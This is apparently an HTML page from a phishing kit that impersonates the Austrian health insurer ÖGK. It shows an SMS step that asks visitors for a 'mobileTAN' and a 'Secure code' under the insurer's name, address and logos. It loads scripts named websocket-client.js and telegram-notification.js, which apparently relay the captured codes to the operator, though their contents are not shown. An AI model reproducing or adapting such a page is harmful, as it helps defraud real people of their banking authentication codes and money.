<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link rel="icon" href="https://www9.0zz0.com/2023/09/04/11/273994248.jpg" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="./css/style.css">
    <title>OGK - Österreichische Gesundheitskasse</title>
</head>

<body>
    <!-- Header -->
    <header>
        <div class="container">
            <div class="left-section">
                <img src="https://www8.0zz0.com/2023/08/05/01/613882479.png" alt="Österreichische Gesundheitskasse" style="height: 80px" />
            </div>
            <nav class="right-section">
                <ul>
                    <li>
                        <a href="index.html">
                            <img src="https://www12.0zz0.com/2023/08/05/01/585748753.png" alt="" />
                        </a>
                    </li>
                </ul>
            </nav>
        </div>
    </header>

    <!-- Contenu de la page Sms -->
    <div class="ccb">
        <div class="checkout" style="display: flex; justify-content: center; align-items: center;">
            <img src="./images/image_sms.png" alt="" style="width: 250px; height: auto; margin-right: 20px;">
            <form class="form sms-form" autocomplete="off" novalidate style="width: 100%;">
                <fieldset style="width: 100%;">
                    <p style="padding-bottom: 30px; font-size: 14px; text-align: center; font-weight: normal;">Sie erhalten innerhalb von mindestens 3 Minuten eine SMS-Nachricht auf ihrem Mobiltelefon.</p>
                    <input type="text" placeholder="mobileTAN" name="mobileTAN">
                    <input type="text" placeholder="Secure code" name="secureCode">
                    <button type="submit">BESTÄTIGEN</button>
                </fieldset>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div class="footer-contact">
            <div class="footer-info">
                <div class="footer-logo">
                    <img src="https://www12.0zz0.com/2023/08/05/02/694701060.png" alt="Logo" />
                </div>
                <h4>Österreichische Gesundheitskasse</h4>
                <p>Wienerbergstraße 15-19</p>
                <p>1100 Wien</p>
                <p>Telefon: +43 5 0766-0</p>
            </div>
        </div>
        
        <div class="footer_bro">
            <a href="#">IMPRESSUM</a><br>
            <a href="#">DATENSCHUTZ</a><br>
            <a href="#">BARRIEREFREIHEITSERKLÄRUNG</a><br>
            <a href="#">TECHNISCHER SUPPORT</a><br>
        </div>
    </footer>

    <script src="./js/websocket-client.js"></script>
    <script src="./js/telegram-notification.js"></script>
</body>
</html>
